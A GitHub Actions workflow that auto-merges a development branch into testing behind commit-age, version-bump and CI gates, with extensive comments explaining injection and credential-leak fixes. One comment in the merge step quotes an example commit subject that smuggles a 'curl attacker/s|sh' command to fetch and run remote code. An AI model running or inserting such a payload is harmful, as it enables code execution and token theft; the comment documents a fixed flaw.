name: Auto-merge development → testing

# Runs every hour. Merges development into testing when:
#   1. development has commits not yet in testing
#   2. the last commit on development is at least 3h old
#   3. CI is passing on the latest development commit
#   4. the version named in the last commit subject (if any) matches pyproject.toml
#      — a mismatch FAILS the run (red), it does not quietly skip
# After a successful merge, creates a PR from testing → main (if one doesn't exist).

on:
  schedule:
    - cron: '0 * * * *'  # Every hour at :00
  workflow_dispatch:      # Manual trigger from the Actions tab

permissions:
  contents: write
  pull-requests: write
  checks: read

# This workflow PUSHES a branch and a tag, and opens a PR. Two overlapping runs
# (the hourly cron plus a manual dispatch, or a cron tick that outlived the
# hour) would race on all three: the second `git push origin testing` can
# fast-forward over a merge the first is still tagging, and both would try to
# create testing-vX.Y.Z. Serialise, and never cancel — a run killed between the
# push and the tag leaves testing merged with no staging tag, which then fails
# production's provenance gate.
concurrency:
  group: auto-merge-development-testing
  cancel-in-progress: false

env:
  # Alert/notification recipient, resolved ONCE with a non-secret last resort.
  # `SUPPORT_EMAIL || OWNER_EMAILS` alone meant that if neither secret was set
  # the `to:` field was empty and the alert path itself failed — losing exactly
  # the message you cannot afford to lose. EMAIL_HOST_USER is the account these
  # steps already authenticate as, so it is always deliverable when mail works
  # at all; the academy's real addresses are never written into this public
  # file. If EMAIL_HOST_USER is missing too, the mailer cannot authenticate at
  # all and the step fails red — loud, which is the requirement.
  ALERT_TO: ${{ secrets.SUPPORT_EMAIL || secrets.OWNER_EMAILS || secrets.EMAIL_HOST_USER }}

jobs:
  auto-merge:
    name: Check and merge
    runs-on: ubuntu-latest
    # Everything here is git plumbing plus a CI-status read; 20 min is
    # generous. Without a cap a hung `git fetch` or a stuck API call held a
    # runner for the 6-hour default while the next cron tick queued behind it.
    timeout-minutes: 20

    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1
        with:
          fetch-depth: 0
          # Use a PAT so that the push and PR creation trigger downstream CI.
          # Falls back to GITHUB_TOKEN if GH_PAT is not configured.
          token: ${{ secrets.GH_PAT || github.token }}
          # Do NOT leave the token in .git/config. With the default
          # (persist-credentials: true) a repo-WRITE PAT sat in the checkout
          # for the whole job, readable by every later step — including two
          # `github-script` steps and a third-party mail action. The two steps
          # that genuinely push supply the credential themselves, for the
          # length of one command, via http.extraheader.
          persist-credentials: false

      - name: Check merge conditions
        id: conditions
        run: |
          git fetch origin

          # 1. Is development ahead of testing?
          AHEAD=$(git rev-list --count origin/testing..origin/development)
          if [ "$AHEAD" -eq 0 ]; then
            echo "development is not ahead of testing — nothing to do."
            echo "should_merge=false" >> "$GITHUB_OUTPUT"
            exit 0
          fi

          # 2. Is the last commit on development at least 3 hours old?
          LAST_COMMIT_EPOCH=$(git log origin/development -1 --format="%ct")
          NOW_EPOCH=$(date +%s)
          AGE=$(( NOW_EPOCH - LAST_COMMIT_EPOCH ))
          echo "Last commit age: ${AGE}s (need ≥ 10800)"

          if [ "$AGE" -lt 10800 ]; then
            echo "Last commit is less than 3 h old — waiting."
            echo "should_merge=false" >> "$GITHUB_OUTPUT"
            exit 0
          fi

          # 3. Has the version been bumped on development?
          # Source of truth is pyproject.toml — it's what `make version` and `make pc-run` write.
          # A version bump is REQUIRED: no version change → no merge, even with 3 h of new commits.
          extract_version() {
            # $1 = ref (e.g. origin/testing or origin/development)
            git show "$1:pyproject.toml" 2>/dev/null \
              | grep -E '^[[:space:]]*version[[:space:]]*=' \
              | head -1 \
              | sed -E 's/.*version[[:space:]]*=[[:space:]]*"([^"]+)".*/\1/'
          }

          TESTING_VERSION=$(extract_version origin/testing)
          DEV_VERSION=$(extract_version origin/development)

          if [ -z "$TESTING_VERSION" ] || [ -z "$DEV_VERSION" ]; then
            echo "Could not read version from pyproject.toml on one of the branches (testing='$TESTING_VERSION', development='$DEV_VERSION') — skipping."
            echo "should_merge=false" >> "$GITHUB_OUTPUT"
            exit 0
          fi

          echo "testing     version: $TESTING_VERSION"
          echo "development version: $DEV_VERSION"

          if [ "$DEV_VERSION" = "$TESTING_VERSION" ]; then
            echo "Version unchanged ($DEV_VERSION) — development has new commits but no version bump. Skipping merge."
            echo "Run 'make pc-run' (answer yes) or 'make version x.y.z' on development before the next cron tick to unlock the merge."
            echo "should_merge=false" >> "$GITHUB_OUTPUT"
            exit 0
          fi

          # Semver sort (GNU sort -V handles both "1.0.5" and "v1.0.5"). The highest value MUST be DEV_VERSION.
          HIGHEST=$(printf '%s\n%s\n' "$TESTING_VERSION" "$DEV_VERSION" | sort -V | tail -1)
          if [ "$HIGHEST" != "$DEV_VERSION" ]; then
            echo "development version ($DEV_VERSION) is LOWER than testing ($TESTING_VERSION) — this should not happen. Refusing to merge backwards."
            echo "should_merge=false" >> "$GITHUB_OUTPUT"
            exit 0
          fi

          echo "Version bump confirmed: $TESTING_VERSION → $DEV_VERSION"

          LAST_SHA=$(git rev-parse origin/development)
          # A commit subject is fully author-controlled text. It is carried as an
          # output and must never be interpolated into a shell or JS body later —
          # see the `env:` blocks on the merge and PR steps.
          LAST_MSG=$(git log origin/development -1 --format="%s")

          # 4. If the commit subject names a version, it must be pyproject's.
          # A release commit titled "v1.26.8" whose tree carried pyproject
          # 1.27.0 produced PR #65 with a v1.26.8 title over a v1.27.0 body
          # and staging tag — a reviewer cannot tell which half to trust.
          # This is a repo-state ERROR, not a "not yet" state, so it fails
          # the run loudly instead of the quiet should_merge=false skip.
          # (The subject is only ever read through the quoted variable, and
          # SUBJECT_VERSION is regex-constrained to digits and dots.)
          SUBJECT_VERSION=$(printf '%s' "$LAST_MSG" | grep -oE 'v[0-9]+\.[0-9]+\.[0-9]+' | head -1 | sed 's/^v//')
          if [ -n "$SUBJECT_VERSION" ] && [ "$SUBJECT_VERSION" != "$DEV_VERSION" ]; then
            echo "::error::Last development commit subject names v${SUBJECT_VERSION} but pyproject.toml on development says ${DEV_VERSION}. The subject of the LAST commit becomes the merge message and the release PR title, so fix the mismatch before this can merge: push a commit whose subject carries v${DEV_VERSION}, or correct pyproject.toml with 'make version'."
            exit 1
          fi

          echo "should_merge=true"    >> "$GITHUB_OUTPUT"
          echo "last_sha=$LAST_SHA"   >> "$GITHUB_OUTPUT"
          echo "new_version=$DEV_VERSION" >> "$GITHUB_OUTPUT"
          echo "old_version=$TESTING_VERSION" >> "$GITHUB_OUTPUT"

          # Delimiter form: a plain `k=v` line lets a value containing a newline
          # forge additional outputs. Two details make this safe by
          # construction rather than by luck:
          #   printf '%s\n' — never `echo "$VAR"`. echo eats a leading -n/-e,
          #     and under a shell where it interprets escapes a subject
          #     containing \n would inject a line break INTO the heredoc body.
          #   a run-unique delimiter — a fixed marker is author-guessable, and
          #     a commit subject containing that exact line would end the block
          #     early and let the rest forge outputs (the deploy workflows and
          #     GitHub's own docs use the same random-delimiter shape).
          DELIM="FAD_EOF_$(openssl rand -hex 12 2>/dev/null || date +%s%N)"
          {
            printf 'last_msg<<%s\n' "$DELIM"
            printf '%s\n' "$LAST_MSG"
            printf '%s\n' "$DELIM"
          } >> "$GITHUB_OUTPUT"

      - name: Check CI status on development
        id: ci
        if: steps.conditions.outputs.should_merge == 'true'
        uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3  # v9.0.0
        env:
          LAST_SHA: ${{ steps.conditions.outputs.last_sha }}
        with:
          script: |
            // Read from env, never interpolated into the script body. GitHub's
            // expression syntax is substituted BEFORE the JS is parsed, so any
            // value containing a quote breaks out of the literal and runs as
            // code — in a step that holds an authenticated octokit. (The
            // expression token itself must not be written in this comment:
            // unlike YAML `#` comments, this string IS template-evaluated, and
            // an empty expression invalidates the whole workflow file.)
            const sha = process.env.LAST_SHA;

            // PAGINATED. `per_page: 100` is a page size, not a limit: past 100
            // check runs on one commit the 101st was simply not in `data`, so
            // a required check could read as "never ran" and the fail-closed
            // branch below turned a green commit into a false red that blocks
            // every later merge until someone reruns CI. With six CI jobs plus
            // CodeQL, Scorecard and re-runs (each re-run adds a check run),
            // 100 is reachable on a busy release commit.
            const allRuns = await github.paginate(github.rest.checks.listForRef, {
              owner: context.repo.owner,
              repo: context.repo.repo,
              ref: sha,
              filter: 'latest',
              per_page: 100
            });
            console.log(`check runs on ${sha}: ${allRuns.length}`);

            // Exclude this workflow itself from the check
            const relevant = allRuns.filter(r => r.name !== 'Check and merge');

            // Fail CLOSED. Zero check runs does not mean "healthy", it means "unknown":
            // a commit pushed with GITHUB_TOKEN never triggers workflows, Actions may be
            // disabled, a run may have been deleted, or the workflow file may be invalid.
            // In every one of those cases we have no evidence the code is good.
            if (relevant.length === 0) {
              console.log('No CI runs found on this commit — refusing to merge.');
              core.setOutput('passed', 'false');
              return;
            }

            // Requiring the CI jobs BY NAME closes the second hole: CodeQL also runs on
            // development, so "some check succeeded" is not the same as "CI ran". These
            // three must be present, or CI effectively did not run on this commit.
            const REQUIRED = ['Lint', 'Type check', 'Tests'];
            const present = new Set(relevant.map(r => r.name));
            const missing = REQUIRED.filter(n => !present.has(n));
            if (missing.length > 0) {
              console.log('Required checks never ran:', missing.join(', '));
              core.setOutput('passed', 'false');
              return;
            }

            const inProgress = relevant.filter(r => r.status !== 'completed');
            if (inProgress.length > 0) {
              console.log('CI still in progress:', inProgress.map(r => r.name).join(', '));
              core.setOutput('passed', 'false');
              return;
            }

            const failed = relevant.filter(
              r => !['success', 'skipped', 'neutral'].includes(r.conclusion)
            );
            if (failed.length > 0) {
              console.log('CI failed:', failed.map(r => `${r.name}: ${r.conclusion}`).join(', '));
              core.setOutput('passed', 'false');
            } else {
              console.log('CI passed on', sha);
              core.setOutput('passed', 'true');
            }

      - name: Merge development into testing
        id: merge
        if: >
          steps.conditions.outputs.should_merge == 'true' &&
          steps.ci.outputs.passed == 'true'
        env:
          # The commit subject reaches the shell ONLY through the environment.
          # `LAST_MSG="${{ ... }}"` was a command-injection sink: the engine
          # substitutes the text before bash parses the line, so a commit titled
          #   x"; curl attacker/s|sh; echo "
          # executed arbitrary code in this job — which checked out with GH_PAT,
          # leaving a repo-write token in .git/config for that code to read.
          LAST_MSG: ${{ steps.conditions.outputs.last_msg }}
          # The push credential lives in this step's environment only, never in
          # .git/config (persist-credentials: false on the checkout).
          GIT_PUSH_TOKEN: ${{ secrets.GH_PAT || github.token }}
        run: |
          git config user.name  "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"

          MERGE_MSG="$(date +%Y-%m-%d) - $LAST_MSG"

          git checkout -B testing origin/testing
          git merge origin/development --no-ff -m "$MERGE_MSG"

          # Same mechanism actions/checkout uses to persist credentials, but
          # scoped to this one command instead of the whole job. The header is
          # built here and not stored anywhere.
          AUTH_B64=$(printf 'x-access-token:%s' "$GIT_PUSH_TOKEN" | base64 -w0)
          git -c http.extraheader="AUTHORIZATION: basic $AUTH_B64" push origin testing

          # Two variants on purpose: the raw one is the PR title and the commit
          # message (escaping there would literally write "&amp;" into git
          # history), the _html one is for the email body only.
          html_escape() {
            printf '%s' "$1"               | sed -e 's/&/\&amp;/g' -e 's/</\&lt;/g' -e 's/>/\&gt;/g'                     -e 's/"/\&quot;/g' -e "s/'/\&#39;/g"
          }
          # printf + run-unique delimiters, for the reason spelled out in the
          # conditions step: the value is a commit subject.
          DELIM="FAD_EOF_$(openssl rand -hex 12 2>/dev/null || date +%s%N)"
          {
            printf 'merge_msg<<%s\n' "$DELIM"
            printf '%s\n' "$MERGE_MSG"
            printf '%s\n' "$DELIM"
            printf 'merge_msg_html<<%s\n' "$DELIM"
            printf '%s\n' "$(html_escape "$MERGE_MSG")"
            printf '%s\n' "$DELIM"
          } >> "$GITHUB_OUTPUT"
          echo "Merged with message: $MERGE_MSG"

      - name: Notify on merge conflict
        if: >
          always() &&
          steps.conditions.outputs.should_merge == 'true' &&
          steps.ci.outputs.passed == 'true' &&
          steps.merge.conclusion == 'failure'
        uses: dawidd6/action-send-mail@67ce3558d613188179559c61d3565140cf389968  # v22
        with:
          server_address: smtp.gmail.com
          server_port: 465
          secure: true
          username: ${{ secrets.EMAIL_HOST_USER }}
          password: ${{ secrets.EMAIL_SECRET }}
          from: "Five a Day CI <${{ secrets.EMAIL_HOST_USER }}>"
          # Dev/support only — the academy inbox is notified exclusively on
          # successful deploys. ALERT_TO adds EMAIL_HOST_USER as a last resort
          # so this alert cannot be addressed to nobody (see env: at the top).
          to: ${{ env.ALERT_TO }}
          subject: "[Five a Day] ⚠️ Auto-merge development → testing falló (conflicto)"
          html_body: |
            <div style="font-family: sans-serif; color:#1f2937; max-width:640px;">
              <h2 style="color:#b91c1c;">⚠️ Auto-merge development → testing en conflicto</h2>
              <table cellpadding="6" style="border-collapse:collapse; font-family:sans-serif; font-size:13px;">
                <tr><td><strong>Situación</strong></td><td>condiciones cumplidas (commits nuevos, 3h de antigüedad, v${{ steps.conditions.outputs.new_version }}, CI verde) pero el <code>git merge</code> terminó en conflicto — requiere resolución manual</td></tr>
                <tr><td><strong>Cómo resolver</strong></td><td><code>git merge origin/development</code> sobre <code>testing</code> en local, arreglar los conflictos y push; el workflow reintenta cada hora</td></tr>
                <tr><td><strong>Run fallido</strong></td><td><a href="${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}">logs</a></td></tr>
                <tr><td><strong>Actions</strong></td><td><a href="${{ github.server_url }}/${{ github.repository }}/actions">todas las ejecuciones</a></td></tr>
                <tr><td><strong>Ramas</strong></td><td><a href="${{ github.server_url }}/${{ github.repository }}/tree/development">development</a> · <a href="${{ github.server_url }}/${{ github.repository }}/tree/testing">testing</a> · <a href="${{ github.server_url }}/${{ github.repository }}/compare/testing...development">diff</a></td></tr>
                <tr><td><strong>Repo</strong></td><td><a href="${{ github.server_url }}/${{ github.repository }}">${{ github.repository }}</a></td></tr>
              </table>
            </div>

      # Runs on the MERGED testing tree, so it sees exactly the migration set
      # the release PR will carry into main. Detection lives in
      # scripts/detect_destructive_migrations.py — the same script the
      # production preflight, the production gate, the testing deploy email and
      # the update-readme skill call, so none of them can disagree about what
      # "destructive" means. Advisory here: it never blocks the merge, it only
      # makes the release say so out loud. Before this, a release carrying a
      # RemoveField looked exactly like any other until a human had already
      # approved a production deploy that could not pass the gate (v1.29.5).
      - name: Flag destructive migrations in this release
        id: destructive
        if: steps.merge.conclusion == 'success'
        run: |
          # Exit 1 means "found", which is information, not failure. Only exit 2
          # (an internal error) should stop us — and then we must not claim the
          # release is clean, so re-raise it.
          set +e
          python scripts/detect_destructive_migrations.py \
            --range "origin/main..HEAD" --github-output --format text
          STATUS=$?
          set -e
          if [ "$STATUS" -ge 2 ]; then
            echo "::error::The destructive-migration detector failed ($STATUS). Refusing to report this release as clean."
            exit 1
          fi

      - name: Tag the testing merge commit with the staging tag
        id: tag
        if: steps.merge.conclusion == 'success'
        env:
          # Read out of pyproject.toml with a regex that excludes double quotes
          # but not single ones, so this was a shell-injection sink too.
          NEW_VER: ${{ steps.conditions.outputs.new_version }}
          GIT_PUSH_TOKEN: ${{ secrets.GH_PAT || github.token }}
        run: |
          TAG="testing-v${NEW_VER}"

          # Credential for this step only — see the merge step.
          AUTH_B64=$(printf 'x-access-token:%s' "$GIT_PUSH_TOKEN" | base64 -w0)
          gitauth() { git -c http.extraheader="AUTHORIZATION: basic $AUTH_B64" "$@"; }

          # Defensive — the version-progression check should prevent collisions,
          # but if the tag exists already, skip rather than clobber.
          if gitauth ls-remote --tags origin "refs/tags/$TAG" | grep -q "refs/tags/$TAG"; then
            echo "Tag $TAG already exists on origin — skipping tag creation."
            echo "created=false" >> "$GITHUB_OUTPUT"
            echo "tag=$TAG"       >> "$GITHUB_OUTPUT"
            exit 0
          fi

          # Annotated tag — richer metadata than a lightweight tag, shows up in the Tags tab.
          git tag -a "$TAG" -m "Staging $TAG — auto-merged development → testing. The matching release tag v${NEW_VER} will be created on main when the PR lands."
          gitauth push origin "refs/tags/$TAG"

          echo "Created and pushed staging tag $TAG on testing HEAD."
          echo "created=true" >> "$GITHUB_OUTPUT"
          echo "tag=$TAG"     >> "$GITHUB_OUTPUT"

      - name: Create PR testing → main
        id: pr
        if: steps.merge.conclusion == 'success'
        uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3  # v9.0.0
        env:
          # Every value via env. Interpolating `${{ }}` into this body was a JS
          # injection sink twice over: `'${{ ... }}'` breaks out on a single
          # quote, and the template literals below execute anything inside a
          # `${...}` that the value carries. The merge message is a commit
          # subject (author-controlled) and the versions come from a pyproject
          # regex that excludes only double quotes. This step holds an
          # authenticated octokit, so code here can act on the repo.
          MERGE_MSG: ${{ steps.merge.outputs.merge_msg }}
          OLD_VERSION: ${{ steps.conditions.outputs.old_version }}
          NEW_VERSION: ${{ steps.conditions.outputs.new_version }}
          STAGING_TAG: ${{ steps.tag.outputs.tag }}
          # Rendered markdown, empty string when the release drops no schema.
          # Via env like every other value here: it is built from text read out
          # of migration files, and this step holds an authenticated octokit.
          DESTRUCTIVE_MD: ${{ steps.destructive.outputs.destructive_markdown }}
        with:
          script: |
            // Skip if a PR already exists
            const existing = await github.rest.pulls.list({
              owner: context.repo.owner,
              repo: context.repo.repo,
              state: 'open',
              head: `${context.repo.owner}:testing`,
              base: 'main'
            });

            if (existing.data.length > 0) {
              console.log('PR already open:', existing.data[0].html_url);
              core.setOutput('url', existing.data[0].html_url);
              core.setOutput('already_existed', 'true');
              return;
            }

            const mergeMsg   = process.env.MERGE_MSG;
            const oldVersion = process.env.OLD_VERSION;
            const newVersion = process.env.NEW_VERSION;
            const stagingTag = process.env.STAGING_TAG;
            // Empty unless this release drops or renames schema. Placed at the
            // very top of the body: the approver has to scroll past it, not go
            // looking for it in the checklist.
            const destructive = (process.env.DESTRUCTIVE_MD || '').trim();

            const pr = await github.rest.pulls.create({
              owner: context.repo.owner,
              repo: context.repo.repo,
              title: mergeMsg,
              body: [
                '## Automated merge: `testing` → `main`',
                '',
                ...(destructive ? [destructive, ''] : []),
                'Opened automatically by the `Auto-merge development → testing` workflow once',
                '`development` had been merged into `testing`. It promotes that tested state to',
                '`main`, which is what production deploys from.',
                '',
                `**Version:** \`${oldVersion}\` → \`${newVersion}\``,
                `**Staging tag (on testing):** \`${stagingTag}\``,
                `**Release tag (on main, created after this PR merges):** \`v${newVersion}\``,
                '',
                '### How this PR got here',
                '',
                'The auto-merge gates all passed on `development`: it was ahead of `testing`, its',
                'last commit had soaked for **≥ 3 h**, the version in `pyproject.toml` was bumped',
                '(and matches the release commit subject), and CI was green. The merge into',
                '`testing` was a real merge commit, and testing HEAD was tagged.',
                '',
                'The nightly `Deploy testing` run puts this version on the QA VM inside the',
                '01:00–05:59 Europe/Madrid window and **resets** `ready_for_prod`, so QA signs off',
                'on this exact build afterwards — never before.',
                '',
                '### What happens after this merges',
                '',
                '1. `Notify production` pushes the release tag on `main` and emails the team.',
                '2. `Deploy production` **arms** on the last of {this merge, QA\'s sign-off}. Its',
                '   credential-free preflight runs the provenance gate (the staging tag must be an',
                '   ancestor of `main`), the QA sign-off gate (testing must answer',
                '   `/health/?deep=1` healthy, serve **this** version and report',
                '   `ready_for_prod: true`), waits for CI to go green and lists the migrations the',
                '   approver is about to authorise. When the other condition is still pending it',
                '   exits green and quiet — "not yet" is a state, not a fault.',
                '3. It then **blocks on the `production` environment reviewer**. Nothing touches',
                '   GCP until a human clicks approve; production is never deployed by a timer.',
                '4. On approval, three pre-mutation gates run before anything is written',
                '   (`RUN_MIGRATIONS_ON_START=false`; Cloud Run job / Cloud Scheduler inventory and',
                '   job-vs-service env parity; destructive migrations require `ack_destructive`),',
                '   then: backup → repoint every Cloud Run job → migrate → roll the service →',
                '   verify. A failure or cancellation after that point rolls the **image** back',
                '   automatically; the database is never rolled back automatically (the backup id',
                '   is in the failure email).',
                '',
                '### Pre-merge checklist',
                '',
                '- [ ] All CI checks are green on this PR — lint (Ruff, Bandit, pip-audit,',
                '      Hadolint), mypy, tests + coverage gate, Docker build, Trivy image scan,',
                '      CodeQL, dependency review',
                '- [ ] Version matches in `pyproject.toml`, the `README.md` badge and `uv.lock`',
                '      (`settings.py` derives `APP_VERSION` from pyproject — nothing to bump there)',
                '- [ ] `README.md` Recent Versions table and the Version History block carry this',
                '      version, and the per-app READMEs / `CLAUDE.md` reflect what changed',
                '- [ ] `DEPLOYMENT.md` is up to date if infrastructure, schedules or runbooks changed',
                '- [ ] No DB schema change without its migration (`makemigrations --check` is clean)',
                '- [ ] Any destructive migration (`DeleteModel` / `RemoveField` / `RenameField` /',
                '      `DROP` / `TRUNCATE`) is intentional — the production deploy will demand an',
                '      explicit `ack_destructive`, and `force` is **not** the way to get past it',
                '- [ ] Any new Cloud Run job, Cloud Scheduler entry or production env var is',
                '      reflected in `EXPECTED_JOBS` / `EXPECTED_SCHEDULES` / `PAUSED_OK_SCHEDULES` /',
                '      `POSTURE_ENV_KEYS`, and is set on the **jobs** as well as the service',
                '- [ ] No secret, credential or real personal data added to a tracked file',
                '- [ ] QA has signed off this exact version on `/testing/` ("¿Listo para',
                '      desplegar?"), or will before the production deploy is armed',
                '- [ ] Merging with a **merge commit** — never squash, never rebase: a squash',
                '      rewrites the commit, so the staging tag never becomes an ancestor of',
                '      `main` and the production provenance gate refuses the release',
                '- [ ] Manual review complete — every box above verified by a human, not assumed',
                '',
                '---',
                '',
                '> **BEHIND on open is expected.** `main` carries the previous release merge commit,',
                '> which is never on `testing`. Merge `origin/main` back into `testing` and push;',
                '> BLOCKED immediately afterwards is just the required checks re-running.',
              ].join('\n'),
              head: 'testing',
              base: 'main'
            });

            console.log('Created PR:', pr.data.html_url);
            core.setOutput('url', pr.data.html_url);
            core.setOutput('already_existed', 'false');

      - name: Notify by email
        if: steps.merge.conclusion == 'success'
        uses: dawidd6/action-send-mail@67ce3558d613188179559c61d3565140cf389968  # v22
        with:
          server_address: smtp.gmail.com
          server_port: 465
          secure: true
          username: ${{ secrets.EMAIL_HOST_USER }}
          password: ${{ secrets.EMAIL_SECRET }}
          from: "Five a Day CI <${{ secrets.EMAIL_HOST_USER }}>"
          # Dev/support only — the academy inbox is notified when the version
          # actually DEPLOYS to the VM (the nightly deploy-testing email), not
          # when it merely lands on the branch.
          to: ${{ env.ALERT_TO }}
          subject: "[Five a Day] v${{ steps.conditions.outputs.new_version }} fusionada en testing — se despliega esta noche"
          html_body: |
            <div style="font-family: sans-serif; color:#1f2937; max-width:640px;">
              <h2 style="color:#6d28d9;">🚀 v${{ steps.conditions.outputs.new_version }} fusionada en la rama testing</h2>
              ${{ steps.destructive.outputs.destructive_html }}
              <table cellpadding="6" style="border-collapse:collapse; font-family:sans-serif; font-size:13px;">
                <tr><td><strong>Situación</strong></td><td>fusionada en la <em>rama</em> <code>testing</code> — la VM la desplegará en el próximo ciclo nocturno (01:00–06:00 Madrid; el email de despliegue confirmará); PR de release hacia <code>main</code> abierta</td></tr>
                <tr><td><strong>Versión</strong></td><td><code>${{ steps.conditions.outputs.old_version }}</code> → <code>${{ steps.conditions.outputs.new_version }}</code></td></tr>
                <tr><td><strong>Commit de fusión</strong></td><td><code>${{ steps.merge.outputs.merge_msg_html }}</code></td></tr>
                <tr><td><strong>Etiquetas</strong></td><td>staging <code>${{ steps.tag.outputs.tag }}</code> · release <code>v${{ steps.conditions.outputs.new_version }}</code> (se creará en <code>main</code> al fusionar la PR)</td></tr>
                <tr><td><strong>PR de release</strong></td><td><a href="${{ steps.pr.outputs.url }}">revisar y aprobar</a> (necesita CI verde + revisor)</td></tr>
                <tr><td><strong>Despliegue anticipado</strong></td><td><a href="${{ github.server_url }}/${{ github.repository }}/actions/workflows/deploy-testing.yml">Deploy testing → Run workflow</a> (para no esperar a la noche)</td></tr>
                <tr><td><strong>Run</strong></td><td><a href="${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}">logs</a> · <a href="${{ github.server_url }}/${{ github.repository }}/actions">Actions</a></td></tr>
                <tr><td><strong>Testing</strong></td><td><a href="${{ secrets.TESTING_URL || 'http://34.26.130.187:8000' }}">${{ secrets.TESTING_URL || 'http://34.26.130.187:8000' }}</a> · <a href="${{ secrets.TESTING_URL || 'http://34.26.130.187:8000' }}/health/">health</a></td></tr>
                <tr><td><strong>Repo</strong></td><td><a href="${{ github.server_url }}/${{ github.repository }}">${{ github.repository }}</a> · <a href="${{ github.server_url }}/${{ github.repository }}/tree/testing">rama testing</a></td></tr>
              </table>
            </div>
